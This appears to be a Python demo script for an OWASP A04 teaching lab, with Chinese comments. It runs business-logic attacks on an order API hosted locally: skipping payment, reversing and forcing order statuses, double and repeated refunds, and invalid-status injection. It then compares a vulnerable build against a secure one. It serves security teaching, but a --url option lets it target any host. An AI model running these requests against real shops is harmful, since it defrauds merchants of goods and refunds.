#!/usr/bin/env python3
"""
OWASP A04:2021 - Workflow Bypass Attack Script
=================================================
測試訂單流程繞過漏洞

CWE-841: Improper Enforcement of Behavioral Workflow
CWE-840: Business Logic Errors

Author: OWASP Demo
"""

import requests
import argparse
import json

# ANSI Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'

VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"


def print_banner():
    print(f"""
{RED}╔═══════════════════════════════════════════════════════════════════════════╗
║  ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗███████╗██╗      ██████╗ ██╗    ██╗    ║
║  ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██╔════╝██║     ██╔═══██╗██║    ██║    ║
║  ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ █████╗  ██║     ██║   ██║██║ █╗ ██║    ║
║  ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ██╔══╝  ██║     ██║   ██║██║███╗██║    ║
║  ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██║     ███████╗╚██████╔╝╚███╔███╔╝    ║
║   ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝  ╚══╝╚══╝     ║
║  ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗                         ║
║  ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝                         ║
║  ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗                         ║
║  ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║                         ║
║  ██████╔╝   ██║   ██║     ██║  ██║███████║███████║                         ║
║  ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝                         ║
║                                                                             ║
║  OWASP A04:2021 - Workflow Bypass Attack Script                            ║
║  CWE-841: Improper Enforcement of Behavioral Workflow                       ║
╚═══════════════════════════════════════════════════════════════════════════╝{RESET}
""")


def create_test_order(base_url):
    """創建測試訂單"""
    try:
        response = requests.post(
            f"{base_url}/api/orders/checkout",
            json={
                "items": [{"productId": 1, "quantity": 1, "unitPrice": 99.99}],
                "totalAmount": 99.99
            },
            timeout=5
        )
        if response.status_code == 200:
            return response.json().get("orderId")
    except:
        pass
    return None


def get_order(base_url, order_id):
    """獲取訂單資訊"""
    try:
        response = requests.get(f"{base_url}/api/orders/{order_id}", timeout=5)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return None


def attack_skip_payment(base_url):
    """跳過付款直接發貨"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[1] Skip Payment Attack - 跳過付款直接發貨{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/orders/{{id}}/status")
    print(f"攻擊原理: 直接將訂單狀態從 PENDING 改為 SHIPPED")
    print(f"\n正常流程: PENDING → CONFIRMED → SHIPPED → DELIVERED")
    print(f"攻擊流程: PENDING → SHIPPED (跳過付款確認)")
    
    # 創建訂單
    order_id = create_test_order(base_url)
    
    if not order_id:
        print(f"\n{RED}[ERROR] 無法創建測試訂單{RESET}")
        return False
    
    print(f"\n[*] 創建測試訂單: #{order_id}")
    
    # 獲取當前狀態
    order = get_order(base_url, order_id)
    if order:
        print(f"[*] 當前狀態: {order.get('status', 'UNKNOWN')}")
    
    # 嘗試直接跳到 SHIPPED
    print(f"\n[*] 嘗試直接將狀態改為 SHIPPED...")
    
    try:
        response = requests.put(
            f"{base_url}/api/orders/{order_id}/status",
            json={"status": "SHIPPED"},
            timeout=5
        )
        
        print(f"[*] 響應狀態: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            new_status = data.get("newStatus", data.get("newStatus", data.get("status", "UNKNOWN")))
            
            if new_status == "SHIPPED":
                print(f"\n{RED}[VULNERABLE] 成功跳過付款！{RESET}")
                print(f"    訂單 #{order_id} 現在狀態: {new_status}")
                print(f"    商品將在未付款情況下發貨！")
                return True
            else:
                print(f"\n{GREEN}[PROTECTED] 狀態跳轉被阻止{RESET}")
                return False
        else:
            error = response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text
            print(f"    錯誤: {error}")
            print(f"\n{GREEN}[PROTECTED] 非法狀態轉換被拒絕{RESET}")
            return False
            
    except Exception as e:
        print(f"    [ERROR] {e}")
        return False


def attack_reverse_status(base_url):
    """逆向狀態攻擊"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[2] Reverse Status Attack - 逆向狀態攻擊{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/orders/{{id}}/status")
    print(f"攻擊原理: 將已發貨訂單改回待處理狀態（例如獲取退款後重新發貨）")
    
    # 創建並推進訂單
    order_id = create_test_order(base_url)
    
    if not order_id:
        print(f"\n{RED}[ERROR] 無法創建測試訂單{RESET}")
        return False
    
    print(f"\n[*] 創建測試訂單: #{order_id}")
    
    # 嘗試正常流程推進到 CONFIRMED
    try:
        requests.put(
            f"{base_url}/api/orders/{order_id}/status",
            json={"status": "CONFIRMED"},
            timeout=5
        )
    except:
        pass
    
    order = get_order(base_url, order_id)
    current_status = order.get("status", "UNKNOWN") if order else "UNKNOWN"
    print(f"[*] 當前狀態: {current_status}")
    
    # 嘗試逆向到 PENDING
    print(f"\n[*] 嘗試將狀態從 {current_status} 改回 PENDING...")
    
    try:
        response = requests.put(
            f"{base_url}/api/orders/{order_id}/status",
            json={"status": "PENDING"},
            timeout=5
        )
        
        print(f"[*] 響應狀態: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            new_status = data.get("newStatus", data.get("status", "UNKNOWN"))
            
            if new_status == "PENDING":
                print(f"\n{RED}[VULNERABLE] 狀態逆向成功！{RESET}")
                print(f"    訂單可被重新處理，可能導致：")
                print(f"    - 重複發貨")
                print(f"    - 重複退款")
                return True
            else:
                print(f"\n{GREEN}[PROTECTED] 逆向狀態轉換被阻止{RESET}")
                return False
        else:
            print(f"\n{GREEN}[PROTECTED] 非法狀態轉換被拒絕{RESET}")
            return False
            
    except Exception as e:
        print(f"    [ERROR] {e}")
        return False


def attack_direct_delivered(base_url):
    """直接標記為已交付"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[3] Direct Delivered Attack - 直接標記已交付{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/orders/{{id}}/status")
    print(f"攻擊原理: 從 PENDING 直接跳到 DELIVERED，繞過所有中間步驟")
    
    order_id = create_test_order(base_url)
    
    if not order_id:
        print(f"\n{RED}[ERROR] 無法創建測試訂單{RESET}")
        return False
    
    print(f"\n[*] 創建測試訂單: #{order_id}")
    print(f"[*] 嘗試直接將狀態改為 DELIVERED...")
    
    try:
        response = requests.put(
            f"{base_url}/api/orders/{order_id}/status",
            json={"status": "DELIVERED"},
            timeout=5
        )
        
        print(f"[*] 響應狀態: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            new_status = data.get("newStatus", data.get("status", "UNKNOWN"))
            
            if new_status == "DELIVERED":
                print(f"\n{RED}[VULNERABLE] 直接交付成功！{RESET}")
                print(f"    商品未經任何流程即標記為已交付")
                return True
            else:
                print(f"\n{GREEN}[PROTECTED] 狀態跳轉被阻止{RESET}")
                return False
        else:
            print(f"\n{GREEN}[PROTECTED] 非法狀態轉換被拒絕{RESET}")
            return False
            
    except Exception as e:
        print(f"    [ERROR] {e}")
        return False


def attack_refund_abuse(base_url):
    """退款濫用攻擊"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[4] Refund Abuse Attack - 退款濫用{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/orders/{{id}}/refund")
    print(f"攻擊原理: 對未交付訂單請求退款，或超額退款")
    
    order_id = create_test_order(base_url)
    
    if not order_id:
        print(f"\n{RED}[ERROR] 無法創建測試訂單{RESET}")
        return False
    
    print(f"\n[*] 創建測試訂單: #{order_id}")
    
    order = get_order(base_url, order_id)
    order_total = 99.99
    if order:
        order_total = order.get("totalAmount", 99.99)
        print(f"[*] 訂單狀態: {order.get('status', 'UNKNOWN')}")
        print(f"[*] 訂單金額: ${order_total}")
    
    # 嘗試對未交付訂單退款
    print(f"\n[*] 嘗試對 PENDING 狀態訂單請求退款...")
    
    try:
        response = requests.post(
            f"{base_url}/api/orders/{order_id}/refund",
            json={
                "amount": order_total * 2,  # 請求雙倍退款
                "reason": "Not satisfied"
            },
            timeout=5
        )
        
        print(f"[*] 響應狀態: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            refunded = data.get("refundedAmount", 0)
            
            if refunded > 0:
                print(f"\n{RED}[VULNERABLE] 非法退款成功！{RESET}")
                print(f"    訂單狀態: PENDING (未交付)")
                print(f"    請求退款: ${order_total * 2}")
                print(f"    實際退款: ${refunded}")
                
                if refunded > order_total:
                    print(f"    {RED}超額退款！多退 ${refunded - order_total}{RESET}")
                
                return True
            else:
                print(f"\n{GREEN}[PROTECTED] 退款被拒絕{RESET}")
                return False
        else:
            error = response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text
            print(f"    錯誤: {error}")
            print(f"\n{GREEN}[PROTECTED] 非法退款被拒絕{RESET}")
            return False
            
    except Exception as e:
        print(f"    [ERROR] {e}")
        return False


def attack_multiple_refunds(base_url):
    """多次退款攻擊"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[5] Multiple Refunds Attack - 多次退款攻擊{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/orders/{{id}}/refund")
    print(f"攻擊原理: 對同一訂單多次請求退款")
    
    order_id = create_test_order(base_url)
    
    if not order_id:
        print(f"\n{RED}[ERROR] 無法創建測試訂單{RESET}")
        return False
    
    print(f"\n[*] 創建測試訂單: #{order_id}")
    
    # 先將訂單推進到 DELIVERED (如果可能)
    for status in ["CONFIRMED", "SHIPPED", "DELIVERED"]:
        try:
            requests.put(
                f"{base_url}/api/orders/{order_id}/status",
                json={"status": status},
                timeout=5
            )
        except:
            pass
    
    order = get_order(base_url, order_id)
    order_total = 99.99
    if order:
        order_total = order.get("totalAmount", 99.99)
        print(f"[*] 訂單狀態: {order.get('status', 'UNKNOWN')}")
        print(f"[*] 訂單金額: ${order_total}")
    
    # 嘗試多次退款
    total_refunded = 0
    refund_count = 0
    
    print(f"\n[*] 嘗試多次退款...")
    
    for i in range(3):
        try:
            response = requests.post(
                f"{base_url}/api/orders/{order_id}/refund",
                json={
                    "amount": order_total,
                    "reason": f"Refund attempt {i+1}"
                },
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                refunded = data.get("refundedAmount", 0)
                if refunded > 0:
                    total_refunded += refunded
                    refund_count += 1
                    print(f"    退款 {i+1}: ${refunded} - 成功")
                else:
                    print(f"    退款 {i+1}: 失敗 - 無退款金額")
            else:
                error = response.json().get("error", "Unknown") if response.headers.get('content-type', '').startswith('application/json') else "Rejected"
                print(f"    退款 {i+1}: 失敗 - {error}")
                
        except Exception as e:
            print(f"    退款 {i+1}: 錯誤 - {e}")
    
    print(f"\n[*] 結果:")
    print(f"    成功退款次數: {refund_count}")
    print(f"    總退款金額: ${total_refunded}")
    print(f"    訂單原價: ${order_total}")
    
    if total_refunded > order_total:
        print(f"\n{RED}[VULNERABLE] 多次退款成功！超額退款 ${total_refunded - order_total}{RESET}")
        return True
    elif refund_count > 1:
        print(f"\n{RED}[VULNERABLE] 允許多次退款！{RESET}")
        return True
    else:
        print(f"\n{GREEN}[PROTECTED] 多次退款被阻止{RESET}")
        return False


def attack_invalid_status(base_url):
    """無效狀態攻擊"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[6] Invalid Status Attack - 無效狀態注入{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/orders/{{id}}/status")
    print(f"攻擊原理: 嘗試設置自定義或無效狀態")
    
    order_id = create_test_order(base_url)
    
    if not order_id:
        print(f"\n{RED}[ERROR] 無法創建測試訂單{RESET}")
        return False
    
    print(f"\n[*] 創建測試訂單: #{order_id}")
    
    invalid_statuses = [
        "REFUNDED",  # 可能的特權狀態
        "COMPLETED",  # 可能跳過流程
        "CANCELLED_BY_ADMIN",  # 管理員操作
        "FREE",  # 嘗試免費
        "PAID_OVERRIDE",  # 繞過付款
    ]
    
    vulnerable = False
    
    for status in invalid_statuses:
        try:
            response = requests.put(
                f"{base_url}/api/orders/{order_id}/status",
                json={"status": status},
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                new_status = data.get("newStatus", data.get("status", "UNKNOWN"))
                
                if new_status == status:
                    print(f"    {status}: {RED}接受 - 漏洞！{RESET}")
                    vulnerable = True
                else:
                    print(f"    {status}: 被正規化為 {new_status}")
            else:
                print(f"    {status}: 被拒絕")
                
        except Exception as e:
            print(f"    {status}: 錯誤 - {e}")
    
    if vulnerable:
        print(f"\n{RED}[VULNERABLE] 接受無效狀態！{RESET}")
        return True
    else:
        print(f"\n{GREEN}[PROTECTED] 所有無效狀態被拒絕{RESET}")
        return False


def compare_vulnerability():
    """比較漏洞版本與安全版本"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}比較漏洞版本 vs 安全版本{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    tests = [
        ("跳過付款", attack_skip_payment),
        ("逆向狀態", attack_reverse_status),
        ("直接交付", attack_direct_delivered),
        ("退款濫用", attack_refund_abuse),
    ]
    
    results = {
        "漏洞版本": {},
        "安全版本": {}
    }
    
    for test_name, test_func in tests:
        print(f"\n\n{YELLOW}========== 測試: {test_name} =========={RESET}")
        
        print(f"\n{BLUE}--- 漏洞版本 ---{RESET}")
        vuln_result = test_func(VULNERABLE_URL)
        results["漏洞版本"][test_name] = vuln_result
        
        print(f"\n{BLUE}--- 安全版本 ---{RESET}")
        secure_result = test_func(SECURE_URL)
        results["安全版本"][test_name] = secure_result
    
    # 摘要
    print(f"\n\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}結果摘要{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n{'測試項目':<20} {'漏洞版本':<15} {'安全版本':<15}")
    print("-" * 50)
    
    for test_name, _ in tests:
        vuln_status = f"{RED}VULNERABLE{RESET}" if results["漏洞版本"].get(test_name) else f"{GREEN}OK{RESET}"
        secure_status = f"{RED}VULNERABLE{RESET}" if results["安全版本"].get(test_name) else f"{GREEN}PROTECTED{RESET}"
        print(f"{test_name:<20} {vuln_status:<25} {secure_status:<25}")


def main():
    parser = argparse.ArgumentParser(
        description="Workflow Bypass Attack Script for OWASP A04 Demo",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 workflow_bypass.py --skip-payment     # 跳過付款攻擊
  python3 workflow_bypass.py --reverse          # 逆向狀態攻擊
  python3 workflow_bypass.py --direct           # 直接交付攻擊
  python3 workflow_bypass.py --refund           # 退款濫用攻擊
  python3 workflow_bypass.py --multi-refund     # 多次退款攻擊
  python3 workflow_bypass.py --invalid          # 無效狀態攻擊
  python3 workflow_bypass.py --all              # 所有攻擊
  python3 workflow_bypass.py --compare          # 比較版本
        """
    )
    
    parser.add_argument("--skip-payment", action="store_true", help="跳過付款攻擊")
    parser.add_argument("--reverse", action="store_true", help="逆向狀態攻擊")
    parser.add_argument("--direct", action="store_true", help="直接交付攻擊")
    parser.add_argument("--refund", action="store_true", help="退款濫用攻擊")
    parser.add_argument("--multi-refund", action="store_true", help="多次退款攻擊")
    parser.add_argument("--invalid", action="store_true", help="無效狀態攻擊")
    parser.add_argument("--all", action="store_true", help="所有攻擊")
    parser.add_argument("--compare", action="store_true", help="比較版本")
    parser.add_argument("--url", default=VULNERABLE_URL, help="目標 URL")
    
    args = parser.parse_args()
    
    print_banner()
    
    if args.compare:
        compare_vulnerability()
    elif args.all:
        attack_skip_payment(args.url)
        attack_reverse_status(args.url)
        attack_direct_delivered(args.url)
        attack_refund_abuse(args.url)
        attack_multiple_refunds(args.url)
        attack_invalid_status(args.url)
    else:
        if args.skip_payment:
            attack_skip_payment(args.url)
        if args.reverse:
            attack_reverse_status(args.url)
        if args.direct:
            attack_direct_delivered(args.url)
        if args.refund:
            attack_refund_abuse(args.url)
        if args.multi_refund:
            attack_multiple_refunds(args.url)
        if args.invalid:
            attack_invalid_status(args.url)
        
        if not any([args.skip_payment, args.reverse, args.direct, args.refund, args.multi_refund, args.invalid]):
            attack_skip_payment(args.url)
    
    print(f"\n{BLUE}[*] Workflow Bypass 攻擊展示完成{RESET}")


if __name__ == "__main__":
    main()
